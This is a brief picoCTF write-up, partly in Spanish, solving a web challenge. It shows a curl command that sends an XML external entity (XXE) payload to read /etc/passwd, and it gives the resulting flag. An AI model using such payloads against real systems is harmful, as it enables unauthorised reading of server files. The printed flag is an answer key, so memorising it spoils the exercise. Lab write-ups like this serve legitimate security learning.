## SOAP
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:53085/)

## Solucion
- Al encontrar la vulnerabilidad del xml y con las pistas dandonos como referencia el archivo de etc/password, utilizamos el siguiente codigo:
```
curl -s -k -X POST http://saturn.picoctf.net:51598/data  -H 'Content-Type: application/xml'   --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [\x0d\x0a  <!ELEMENT foo ANY >\x0d\x0a  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\x0d\x0a]> <data><ID>&xxe;</ID></data>'
```
- Con esto nos regresara la flag escondida en el directorio: picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
